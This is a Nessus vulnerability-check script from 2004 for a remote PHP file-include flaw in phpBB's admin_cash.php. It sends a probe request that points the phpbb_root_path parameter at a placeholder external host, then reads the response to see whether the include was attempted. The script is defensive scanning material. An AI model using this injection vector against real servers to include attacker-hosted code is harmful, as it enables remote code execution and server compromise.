#
# This script is (C) Tenable Network Security
#



if(description)
{
 script_id(15762);
 script_bugtraq_id( 11701 );
 script_version ("$Revision: 1.3 $");

 name["english"] = "phpBB remote PHP file include vulnerability";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote host include php files hosted
on a third party server using the phpBB CGI suite which is installed.

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server.

Solution : Upgrade phpBB to the latest version
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of admin_cash.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security",
		francais:"Ce script est Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("phpbb_detect.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
kb = get_kb_item("www/" + port + "/phpBB");
if ( ! kb ) exit(0);
if(!can_host_php(port:port))exit(0);


matches = eregmatch(pattern:"(.*) under (.*)", string:kb);
loc = matches[2];

req = http_get(item:string(loc, "/admin/admin_cash.php?setmodules=1&phpbb_root_path=http://xxxxxxxx./"), port:port);			
r = http_keepalive_send_recv(port:port, data:req);
if( r == NULL )exit(0);
if(egrep(pattern:".*http://xxxxxxxx./includes/functions_cash\.", string:r))
 {
 	security_hole(port);
	exit(0);
 }
